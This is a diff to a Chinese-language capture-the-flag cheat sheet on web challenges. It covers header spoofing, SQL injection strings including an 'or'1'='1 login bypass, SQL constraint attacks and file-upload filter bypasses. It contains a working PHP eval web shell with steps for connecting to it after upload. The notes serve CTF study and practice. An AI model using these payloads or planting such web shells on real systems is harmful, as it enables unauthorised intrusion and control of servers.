@@ -1,10 +1,12 @@
 # Web
 - 不能全信前端的代码提示
 - 一个复杂的网页，页面中很可能隐藏了重要外链
+- 思路应该灵活，避免深陷一点（比如网站泄露 .git 目录，可能只是一个陷阱，真正的突破口与此毫无关系）
 
 ## HTTP 和网页
 
 - HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode (其实不一定，urldecode 是由编程语言负责的，具体看怎么设定的)
+- HTTP 的 get 方法在传参时不要画蛇添足加""（双引号），http 的参数本身就会被识别为字符串
 
 ### httpie
 
@@ -20,7 +22,19 @@ http GET http:x?name=felord&age=18
 http POST http:x name=felord age=18
 ```
 
-### 前端伪造 ip
+### 前端伪造
+
+#### 伪造浏览器
+
+遇到过一道题，让你用 WLLM 浏览器访问，此时只要设置
+
+```
+User-Agent=WLLM
+```
+
+即可
+
+#### 伪造 ip 
 
 X-Forwarded-For: 127.0.0.1
 
@@ -29,6 +43,8 @@ X-Forwarded-For: 127.0.0.1
 注意观察网站刷新的原因是否由 Cookie 等字段影响的？
 
 ### 网页
+
+- 当 Web 页面的地址更换 (如 /index.php 变为 /a.php)，相应的 get / post 请求应该即使切换到 /a.php
 
 #### 网页链接提取
 
@@ -274,15 +290,25 @@ python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&p
 ```
 
 #### 万能密码表
-> 有时候 sqlmap 无法使用，该方法可以登录进去
+- 有时候 sqlmap 无法使用，该方法可以登录进去
+
 ```url
 http://xxx/?username=admin'or'1'='1&password=123456'or'1'='1
+```
+
+#### 常用注入语句
+
+```sql
+1;show databases#
+1;show tables#
+1;show columns from 'Flag'#
 ```
 
 ### SQL 约束攻击
 
 #### 加一个空格，SQL 查询不会变
-> 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
+- 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
+
 ```sql
 SELECT * FROM users WHERE username='vampire     ';
 ```
@@ -359,17 +385,21 @@ $@ 替代空字符串
 - 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）
 
 ##### 上传
-> 拿到 webshell
->
-> 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行。
->
-> 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
->
-> 如果 [] 被过滤了，可以用 {} 替代？？
+- 拿到 webshell
+
+- 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行（具体看题目怎么绕过的，实测 jpeg 最通用）。
+
+- 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
+
+- 如果 [] 被过滤了，可以用 {} 替代？？
+- flag 不仅可以藏在文件中，还可以藏在环境变量中，在终端输入 `env` 查看环境变量
 
 ###### test.php
 
-- 1.编辑 PHP 文件内容:
+- 有的题需要修改 Content-Type 为 image/jpg 绕过，如果不行，则改成 image/jpeg
+
+1.编辑 PHP 文件内容:
+
 ```php
 <?php eval(@$_POST['a']); ?>
 ```
@@ -379,8 +409,9 @@ $@ 替代空字符串
 <?= eval($_POST['a']);?>
 ```
 
-- 2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
-- 3.使用中国蚁剑连接该文件即可
+2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
+
+3.使用中国蚁剑连接该文件即可
 
 (如果不成功，考虑绕过，试试 test.phtml 方法)【注意，有时候后端检测了文件中的内容，有 <? 就上传不了，可以考虑下面的方法 】
 
@@ -416,6 +447,8 @@ GIF89a 是图片的文件头，用于绕过服务端判断
 3. 在"a.jpg"文件的开头添加"GIF89a"头部，使得这个文件在视觉上表现为一张正常的 JPG 图像，但实际上包含了恶意的PHP代码。
 
 【PS: macOS 的访达中按住 `command + shift + .` 显示隐藏文件】
+
+.user.ini
 
 ```
 GIF89a
